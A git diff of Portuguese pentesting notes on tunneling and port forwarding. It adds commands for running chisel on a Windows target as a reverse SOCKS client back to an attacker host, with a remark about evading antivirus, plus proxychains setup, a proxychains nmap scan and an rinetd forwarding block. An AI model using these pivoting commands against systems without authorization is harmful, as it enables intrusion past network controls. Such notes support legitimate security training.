@@ -1,26 +1,29 @@
 Tunelamento e encaminhamento de portas
 ========================
-# Port forwarding
 
-## rinetd
+## Comandos mais utilizados
 
-    sudo apt update
-    sudo apt install rinetd
-    cat vi /etc/rinetd.conf
-    
-    # forwarding rules come here
-    #
-    # you may specify allow and deny rules after a specific forwarding rule
-    # to apply to only that forwarding rule
-    #
-    # bindadress    bindport  connectaddress  connectport
-            0.0.0.0    80    www.google.com    80
-    
-    
-    sudo systemctl start rinetd
-    
+**Cenário Windows**
 
-## Chisel (melhor opção com o windows)
+No  Windows utilizamos o chisel, porém em ambientes mais maduros o Antivírus pega essa ferramenta. [Vide exemplo de como usá-la](#chisel)
+
+    chisel.exe client <ip_atacante>:<porta> -R:<porta>:socks
+
+Na máquina do atacante (Kali Linux)
+
+    chisel server -p <porta> --socks5 --reverse
+
+Depois é necessário configurar o proxychains:
+
+    echo "socks5 127.0.0.1 5000" >> /etc/proxychains.conf
+    #Comentar a diretiva "proxy_dns"
+
+**Cenário Linux**
+
+
+
+
+## Chisel
 
 Referência: <https://medium.com/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683>
 
@@ -109,6 +112,24 @@ OBS: Vale ressaltar que para que isso funcione conforme o esperado, é necessár
     proxychains nmap -sT -n -Pn 127.0.0.1 --open
 
 OBS: Nesse caso o scan deve ocorrer na localhost, pois o serviço escuta somente na interface local! Mas vale considerar que estou realizando o scan na interface local do SERVER REMOTO. O que me surrpeendeu, porque eu não imaginei isso! De qualquer forma, é interessante levar em conta que eu sairia com o IP 
+
+## rinetd
+
+    sudo apt update
+    sudo apt install rinetd
+    cat vi /etc/rinetd.conf
+    
+    # forwarding rules come here
+    #
+    # you may specify allow and deny rules after a specific forwarding rule
+    # to apply to only that forwarding rule
+    #
+    # bindadress    bindport  connectaddress  connectport
+            0.0.0.0    80    www.google.com    80
+    
+    
+    sudo systemctl start rinetd
+    
 
 
 ## Plink.exe
